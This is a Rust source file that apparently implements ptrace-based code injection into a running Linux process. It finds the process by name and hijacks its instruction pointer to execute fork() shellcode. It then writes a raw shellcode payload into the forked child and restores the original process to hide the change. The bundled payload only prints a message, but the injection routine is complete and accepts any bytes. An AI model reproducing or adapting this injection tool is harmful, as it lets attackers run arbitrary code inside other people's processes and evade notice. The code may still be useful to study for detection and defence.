#![allow(non_snake_case)]

use sysinfo::System;
use std::ffi::{OsStr, c_void};
use nix::{sys::{ptrace::{self, attach, cont, detach, getevent, getregs, setoptions, setregs, write, AddressType, Options}, wait::waitpid}, unistd::Pid};

// Shellcode that prints "Injected: ar.p"
const PAYLOAD: [u8; 59] = [
                                0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xbe, 0x49, 0x6e, 0x6a, 
                                0x65, 0x63, 0x74, 0x65, 0x64, 0x56, 0x48, 0x89, 0xe6, 0xba, 
                                0x08, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x01, 0x00, 0x00, 
                                0x00, 0x48, 0xbe, 0x3a, 0x20, 0x61, 0x72, 0x2e, 0x70, 0x00, 
                                0x00, 0x56, 0x48, 0x89, 0xe6, 0xba, 0x06, 0x00, 0x00, 0x00, 
                                0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05    
                           ];

//fork syscall
const FORK: [u8; 7] = [0x48, 0x31, 0xc0, 0xb0, 0x39, 0x0f, 0x05];


pub fn getPID(pname: String) { 

    // Create sysinfo object and refresh to collect current os state
    let mut sys = System::new();
    sys.refresh_all();

    // Getting Process Pid
    let ppid = sys.processes_by_name(OsStr::new(&pname)).take(1).next().expect(format!("{:?} is not active.", pname).as_str());
    let pid = ppid.pid().as_u32() as i32;

    // Check thread 
    THREAD(pid, pname);

}


fn THREAD(pid: i32, pname: String) {
    
    let pid = Pid::from_raw(pid);

    attach(pid).unwrap();
    println!("[>] Attaching on {:?} PID: ({})", pname, pid); 

    waitpid(pid, None).unwrap();
    setoptions(pid, Options::PTRACE_O_TRACEFORK).unwrap();

    println!("[>] Getting the original registers");
    let regs = getregs(pid).unwrap(); 

    let rip = regs.rip;
    let instruction = ptrace::read(pid, rip as AddressType).unwrap();

    println!("\t+ Injecting fork() shellcode into {:?}", pname); 
    memINJECT(pid, rip, &FORK);
   
    ptrace::cont(pid, None).unwrap();
    waitpid(pid, None).unwrap();

    println!("\t+ fork() shellcode executed successfully");
    let cpid = Pid::from_raw(getevent(pid).unwrap() as i32);

    waitpid(cpid, None).unwrap();
    let crip = getregs(cpid).unwrap().rip;

    println!("\t+ Injecting Payload into Child Process CPID: ({})", cpid); 
    memINJECT(cpid, crip, &PAYLOAD);
    
    cont(pid, None).unwrap();
    waitpid(pid, None).unwrap();

    unsafe {write(pid, regs.rip as AddressType, instruction as *mut c_void).unwrap()};
    setregs(pid, regs).unwrap();
    println!("[>] {:?} process restored successfully", pname);   

    detach(pid, None).unwrap();
    println!("[>] Detach from PID: ({})", pid);

}


fn memINJECT(pid: Pid, rip: u64, shellcode: &[u8]) {
    
    let mut addr = rip;
    println!("\t+ Hijacking RIP: {:#x}", rip);
    
    for byte in shellcode.iter() {
        unsafe{ write(pid, addr as AddressType, *byte as *mut c_void).unwrap(); }
        addr += 1;
    }

}
